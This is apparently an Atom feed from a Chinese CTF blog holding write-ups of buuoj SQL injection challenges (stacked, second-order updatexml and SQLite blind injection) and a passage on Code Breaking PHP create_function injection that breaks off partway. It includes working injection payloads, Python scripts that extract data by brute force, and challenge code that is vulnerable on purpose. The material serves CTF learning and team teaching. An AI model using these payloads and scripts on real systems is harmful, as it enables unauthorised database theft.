<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>peri0d的博客</title>
  
  <subtitle>我是一只小兔子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-28T09:46:37.055Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>peri0d</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuoj的几个SQL注入</title>
    <link href="http://yoursite.com/2019/09/28/buu%20SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/09/28/buu SQL注入/</id>
    <published>2019-09-28T09:47:19.888Z</published>
    <updated>2019-09-28T09:46:37.055Z</updated>
    
    <content type="html"><![CDATA[<p>buuoj 上的几个注入，作为学校团队分享的材料</p><a id="more"></a><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><ul><li><a href="https://peri0d.xyz/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">堆叠注入</a></li></ul><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><ul><li><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easy_sql" target="_blank" rel="noopener">easy_sql github</a></p></li><li><p>打开靶机，是这样的界面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_1.png" alt></p></li><li><p>直接用字典 fuzz 看一下过滤了哪些字符，如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_2.png" alt></p></li><li><p>这个和强网杯相似，都是堆叠注入，在公开的源码中可以看到，传入的 <code>query</code> 长度不超过 40，强网杯的不能用了</p></li><li><p>关键的查询代码是 <code>select $post[&#39;query&#39;]||flag from Flag</code> </p></li><li><p>输入 1 或 0 查询结果如图，要想办法让 <code>||</code> 不是逻辑或</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_3.png" alt></p></li><li><p>官方给的 payload 是 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> </p></li><li><p>拼接一下就是 <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code> </p></li><li><p>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符</p></li><li><p>关于 <code>sql_mode</code> 更多可以查看这个链接 : <a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode 说明</a></p></li><li><p>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_4.png" alt></p></li><li><p>关于非预期解 : <code>*,1</code> </p></li><li><p>拼接一下，不难理解 : <code>select *,1||flag from Flag</code> </p></li><li><p>等同于 <code>select *,1 from Flag</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_5.png" alt></p></li></ul><h1 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h1><ul><li><p><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/RCTF2015/easysql" target="_blank" rel="noopener">EasySQL github</a></p></li><li><p>打开靶机，是如下界面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_1.png" alt></p></li><li><p>到注册页面，试了一下，<code>username</code> 和 <code>email</code> 处有过滤，直接 fuzz 一下哪些字符被禁了</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_2.png" alt></p></li><li><p>注册成功之后，有一个修改密码的功能，这里的考点应该就是二次注入</p></li><li><p>它在存入数据库时进行了特殊字符的处理，但是在修改密码这里，从数据库中读取出来时，没有对数据处理</p></li><li><p>注册用户名 <code>&#39;sss&quot;\</code> ，在修改密码处的有个报错的回显</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_3.png" alt></p></li><li><p>可以猜出来 sql 语句应该是类似于这样子的 <code>select * from user where username=&quot;&#39;sss&quot;\&quot; and password=&#39;d41d8cd98f00b204e9800998ecf8427e&#39;</code> </p></li><li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_4.png" alt></p></li><li><p>经过测试，flag 不在 flag 表中</p></li><li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_5.png" alt></p></li><li><p>发现输出有长度限制</p></li><li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))#</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_6.png" alt></p></li><li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_7.png" alt></p></li><li><p>这里就很尴尬了，所以不如 <code>reverse</code> 逆序输出</p></li><li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;))),1))#</code> </p></li><li><p>放个脚本，代表了这一题的整个流程，也记录的我的犯傻</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_reg = <span class="string">'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/register.php'</span></span><br><span class="line">url_log = <span class="string">'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/login.php'</span></span><br><span class="line">url_change = <span class="string">'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/changepwd.php'</span></span><br><span class="line"></span><br><span class="line">pre = <span class="string">'peri0d"'</span></span><br><span class="line">suf = <span class="string">"'))),1))#"</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line">s = list(s)</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'username'</span> : name,</span><br><span class="line"><span class="string">'password'</span> : <span class="string">'123'</span>,</span><br><span class="line"><span class="string">'email'</span> : <span class="string">'123'</span>,</span><br><span class="line">&#125;</span><br><span class="line">r.post(url=url_reg, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name)</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'username'</span> : name,</span><br><span class="line"><span class="string">'password'</span> : <span class="string">'123'</span>,</span><br><span class="line">&#125;</span><br><span class="line">r.post(url=url_log, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changepwd</span><span class="params">()</span>:</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'oldpass'</span> : <span class="string">''</span>,</span><br><span class="line"><span class="string">'newpass'</span> : <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line">kk = r.post(url=url_change, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'target'</span> <span class="keyword">not</span> <span class="keyword">in</span> kk.text:</span><br><span class="line">print(kk.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">paylaod = pre + <span class="string">"||(updatexml(1,concat((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('"</span> + i + suf</span><br><span class="line">register(paylaod)</span><br><span class="line">login(paylaod)</span><br><span class="line">changepwd()</span><br></pre></td></tr></table></figure></li></ul><h1 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h1><ul><li><p>打开靶机，看到投票的页面，并且给了源码</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_1.png" alt></p></li><li><p>在 <code>vote.php</code> 页面 <code>POST</code> 参数 <code>id</code> ，只能为数字。并且在 <code>schema.sql</code> 中发现了 <code>flag</code> 表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS `vote`;</span><br><span class="line">CREATE TABLE `vote` (</span><br><span class="line">  `id` INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">  `name` TEXT NOT NULL,</span><br><span class="line">  `count` INTEGER</span><br><span class="line">);</span><br><span class="line">INSERT INTO `vote` (`name`, `count`) VALUES</span><br><span class="line">  (&apos;dog&apos;, 0),</span><br><span class="line">  (&apos;cat&apos;, 0),</span><br><span class="line">  (&apos;zebra&apos;, 0),</span><br><span class="line">  (&apos;koala&apos;, 0);</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `flag`;</span><br><span class="line">CREATE TABLE `flag` (</span><br><span class="line">  `flag` TEXT NOT NULL</span><br><span class="line">);</span><br><span class="line">INSERT INTO `flag` VALUES (&apos;HarekazeCTF&#123;&lt;redacted&gt;&#125;&apos;);</span><br></pre></td></tr></table></figure></li><li><p>在 <code>vote.php</code> 中给出了查询的 SQL 语句，但是对参数进行了检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>UPDATE</code> 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 <code>&#39;</code> 和 <code>&quot;</code> 这就无法使用字符进行判断，<code>char</code> 又被过滤也无法使用 ASCII 码判断</p></li><li><p>所以可以考虑使用 <code>hex</code> 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示</p></li><li><p>先考虑对 flag 16 进制长度的判断，假设它的长度为 <code>x</code>，<code>y</code> 表示 2 的 n 次方，那么 <code>x&amp;y</code> 就能表现出 <code>x</code> 二进制为 1 的位置，将这些 <code>y</code> 再进行或运算就可以得到完整的 <code>x</code> 的二进制，也就得到了 flag 的长度，而 <code>1&lt;&lt;n</code> 恰可以表示 2 的 n 次方</p></li><li><p>那么如何构造报错语句呢？在 <code>sqlite</code> 中，<code>abs</code> 函数有一个整数溢出的报错，如果 <code>abs</code> 的参数是 <code>-9223372036854775808</code> 就会报错，同样如果是正数也会报错</p></li><li><p>判断长度的 payload : <code>abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end)</code> </p></li><li><p>脚本如下，长度 84</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php"</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">payload = <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;n&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'id'</span> : payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line">print(r.text)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'occurred'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">l = l|<span class="number">1</span>&lt;&lt;n</span><br><span class="line"></span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_2.png" alt></p></li><li><p>然后考虑逐字符进行判断，但是 <code>is_valid()</code> 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断</p></li><li><p>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 <code>ABCDEF</code> ，这样十六进制的所有字符都可以使用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hex(b'zebra') = 7A65627261</span></span><br><span class="line"><span class="comment"># 除去 12567 就是 A ，其余同理</span></span><br><span class="line">A = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line"></span><br><span class="line">C = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line"></span><br><span class="line">D = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line"></span><br><span class="line">E = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line"></span><br><span class="line">F = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(b'koala') = 6B6F616C61</span></span><br><span class="line"><span class="comment"># 除去 16CF 就是 B</span></span><br><span class="line">B = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;C&#125;</span>||<span class="subst">&#123;F&#125;</span>)'</span></span><br></pre></td></tr></table></figure></li><li><p>然后逐字符进行爆破，已经知道 flag 格式为 <code>flag{}</code> ，<code>hex(b&#39;flag{&#39;)==666C61677B</code>  ，在其后面逐位添加十六进制字符，构成 paylaod</p></li><li><p>再利用 <code>replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;)</code> 这个语句进行判断</p></li><li><p>如果 flag 不包含 payload ，那么得到的 <code>length</code> 必为 84 ，最外面的 <code>replace</code> 将返回 <code>false</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0</code> ，它不报错</p></li><li><p>如果 flag 包含 payload ，那么 <code>replace(flag, payload, &#39;&#39;)</code> 将 flag 中的 payload 替换为空，得到的 <code>length</code> 必不为 84 ，最外面的 <code>replace</code> 将返回 <code>true</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0x8000000000000000</code> 令其报错</p></li><li><p>以上就可以根据报错爆破出 flag，最后附上出题人脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://domain/vote.php'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">    t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;buuoj 上的几个注入，作为学校团队分享的材料&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="buuoj" scheme="http://yoursite.com/tags/buuoj/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeBreaking 代码审计</title>
    <link href="http://yoursite.com/2019/09/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2019/09/14/代码审计/</id>
    <published>2019-09-14T08:46:49.189Z</published>
    <updated>2019-09-18T06:33:15.981Z</updated>
    
    <content type="html"><![CDATA[<p>CodeBreaking : <a href="https://code-breaking.com/" target="_blank" rel="noopener">https://code-breaking.com/</a></p><p>在线正则表达式匹配 : <a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></p><p>根据已有的大佬们的 wp 对 code breaking 做的一个复现，很多内容都是第一次接触，对涉及到的知识点做些总结和拓展。</p><a id="more"></a><h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><ul><li><p>create_function 注入</p></li><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>正则 <code>/i</code> 不区分大小写，<code>/s</code> 匹配任何不可见字符，包括空格，TAB，换行，<code>/D</code> 如果使用 <code>$</code> 限制结尾字符，则不允许结尾有换行</p></li><li><p><code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code> 匹配所有字母，数字和下划线开头的字符串</p></li><li><p>想通过 fuzz 找到字符串以达到 bypass 的目的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_start = <span class="string">'http://192.168.233.132:8087/?action='</span></span><br><span class="line">url_end = <span class="string">'var_dump&amp;arg=2'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">i = chr(i).encode()</span><br><span class="line">para = i.hex()</span><br><span class="line"></span><br><span class="line">url = url_start + <span class="string">'%'</span> + str(para) + url_end</span><br><span class="line">r = requests.get(url=url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 不出现 error 且 不返回 index.php</span></span><br><span class="line"><span class="keyword">if</span> (r.headers[<span class="string">'Content-Length'</span>] != <span class="string">'279'</span>) <span class="keyword">and</span> (<span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">print(para)</span><br></pre></td></tr></table></figure></li><li><p>找到了 <code>%5c</code>，即 <code>\</code>，可以让 var_dump 成功执行，ph 牛给了如下的解释。接下来就是 getshell 函数的寻找，要有两个参数且第二个参数可能会导致 RCE</p><blockquote><p>php 里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 function_name() 调用，调用的时候其实相当于写了一个相对路径；而如果写 \function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote></li><li><p>不难发现函数 create_function，官方定义如图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webnoteasy_1.png" alt></p></li><li><p>以如下代码为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span 